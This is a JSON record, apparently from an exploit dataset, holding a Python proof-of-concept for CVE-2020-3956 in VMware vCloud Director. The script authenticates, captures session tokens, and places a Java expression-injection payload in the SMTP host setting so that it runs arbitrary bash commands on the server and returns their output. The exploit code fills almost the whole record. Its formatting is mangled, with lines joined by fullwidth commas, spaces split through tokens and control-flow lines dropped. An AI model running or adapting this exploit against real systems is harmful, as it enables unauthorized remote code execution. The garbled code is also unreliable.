{
    "text": "vul_name : vCloud Director 9.7.0.15498291 Remote Code Execution ， vul_cve : CVE-2020-3956 ， vul_poc :  #  ! /usr/bin/python ，  # Exploit Title : vCloud Director - Remote Code Execution ，  # Exploit Author : Tomas Melicher ，  # Technical Details :  ，  # Date : 2020-05-24 ，  # Vendor Homepage :  ，  # Software Link :  ，  # Tested On : vCloud Director 9.7.0.15498291 ，  # Vulnerability Description :  ，  # VMware vCloud Director suffers from an Expression Injection Vulnerability allowing Remote Attackers to gain Remote Code Execution ( RCE ) via submitting malicious value as a SMTP host name. ， from urllib.parse import urlparse ， from urlparse import urlparse ， from requests.packages.urllib3.exceptions import InsecureRequestWarning ， requests.packages.urllib3.disable_warnings ( InsecureRequestWarning )  ， PAYLOAD_TEMPLATE = \" $ {'.getClass (  ) .forName ( 'java.io.BufferedReader' ) .getDeclaredConstructors (  )  [ 1 ] .newInstance ( '.getClass (  ) .forName ( 'java.io.InputStreamReader' ) .getDeclaredConstructors (  )  [ 3 ] .newInstance ( '.getClass (  ) .forName ( 'java.lang.ProcessBuilder' ) .getDeclaredConstructors (  )  [ 0 ] .newInstance (  [ 'bash' , '-c' , 'echo COMMAND | base64 -di | bash | base64 -w 0' ]  ) .start (  ) .getInputStream (  ) .readLine (  ) }\" ， session = requests.Session (  )  ， target_url = '%s : /%s%s'% ( url.scheme , url.netloc , url.path )  ， res = session.get ( target_url )  ， match = re.search ( r'tenant :  (  [ ^\" ] + ) ' , res.content , re.IGNORECASE )  ， tenant = match.group ( 1 )  ， print ( ' [  !  ] can\\'t find tenant identifier' )  ， print ( ' [  *  ] tenant : %s'% ( tenant )  ， match = re.search ( r'security_check\\? [ ^\" ] +' , res.content , re.IGNORECASE )  ， login_url = '%s : /%s/login/%s'% ( url.scheme , url.netloc , match.group ( 0 )  ， res = session.post ( login_url , data={'username' : username , 'password' : password} )  ， print ( ' [  !  ] invalid credentials' )  ， match = re.search ( r'/cloudapi/. * /sessions' , res.content , re.IGNORECASE )  ， login_url = '%s : /%s%s'% ( url.scheme , url.netloc , match.group ( 0 )  ， headers = { ， 'Authorization' : 'Basic %s'% ( base64.b64encode ( '%s @ %s : %s'% ( username , tenant , password )  ,  ， 'Accept' : 'application/json ; version=29.0' ,  ， 'Content-type' : 'application/json ; version=29.0' ， } ， res = session.post ( login_url , headers=headers )  ， print ( ' [  !  ] invalid credentials' )  ， print ( ' [  !  ] url for login form was not found' )  ， cookies = session.cookies.get_dict (  )  ， jwt = cookies [ 'vcloud_jwt' ]  ， session_id = cookies [ 'vcloud_session_id' ]  ， print ( ' [  *  ] jwt token : %s'% ( jwt )  ， print ( ' [  *  ] session_id : %s'% ( session_id )  ， res = session.get ( target_url )  ， match = re.search ( r'organization : \\' (  [ ^\\' ] + ) ' , res.content , re.IGNORECASE )  ， print ( ' [  !  ] organization not found' )  ， organization = match.group ( 1 )  ， print ( ' [  *  ] organization name : %s'% ( organization )  ， match = re.search ( r'orgId : \\' (  [ ^\\' ] + ) ' , res.content )  ， print ( ' [  !  ] orgId not found' )  ， org_id = match.group ( 1 )  ， print ( ' [  *  ] organization identifier : %s'% ( org_id )  ，  ( jwt , session_id , organization , org_id ) = login ( url , username , password , verbose )  ， headers = { ， 'Accept' : 'application/ * +xml ; version=29.0' ,  ， 'Authorization' : 'Bearer %s'%jwt ,  ， 'x-vcloud-authorization' : session_id ， } ， admin_url = '%s : /%s/api/admin/'% ( url.scheme , url.netloc )  ， res = session.get ( admin_url , headers=headers )  ， match = re.search ( r'<description>\\s *  (  [ ^<\\s ] + ) ' , res.content , re.IGNORECASE )  ， version = match.group ( 1 )  ， print ( ' [  *  ] detected version of Cloud Director : %s'% ( version )  ， version = None ， print ( ' [  !  ] can\\'t find version of Cloud Director , assuming it is more than 10.0' )  ， email_settings_url = '%s : /%s/api/admin/org/%s/settings/email'% ( url.scheme , url.netloc , org_id )  ， payload = PAYLOAD_TEMPLATE.replace ( 'COMMAND' , base64.b64encode ( ' ( %s ) 2>&1'%command )  ， data = '<root : OrgEmailSettings xmlns : root=\" ， data += '<root : IsDefaultOrgEmail>true</root : IsDefaultOrgEmail><root : FromEmailAddress/><root : DefaultSubjectPrefix/>' ， data += '<root : IsAlertEmailToAllAdmins>true</root : IsAlertEmailToAllAdmins><root : AlertEmailTo/><root : SmtpServerSettings>' ， data += '<root : IsUseAuthentication>false</root : IsUseAuthentication><root : Host>%s</root : Host><root : Port>25</root : Port>'% ( payload )  ， data += '<root : Username/><root : Password/></root : SmtpServerSettings></root : OrgEmailSettings>' ， res = session.put ( email_settings_url , data=data , headers=headers )  ， match = re.search ( r'value : \\s * \\ [  (  [ ^\\ ] + ) \\ ] ' , res.content )  ， print ( ' )  ， print ( base64.b64decode ( match.group ( 1 )  ， print ( res.content )  ， parser = argparse.ArgumentParser ( usage='% ( prog ) s -t target -u username -p password [ -c command ]  [ -check ] ' )  ， parser.add_argument ( '-v' , action='store_true' )  ， parser.add_argument ( '-t' , metavar='target' , help='url to html5 client ( required=True )  ， parser.add_argument ( '-u' , metavar='username' , required=True )  ， parser.add_argument ( '-p' , metavar='password' , required=True )  ， parser.add_argument ( '-c' , metavar='command' , help='command to execute' , default='id' )  ， args = parser.parse_args (  )  ， url = urlparse ( args.t )  ， exploit ( url , args.u , args.p , args.c , args.v ) ",
    "time": "2020.06.03"
}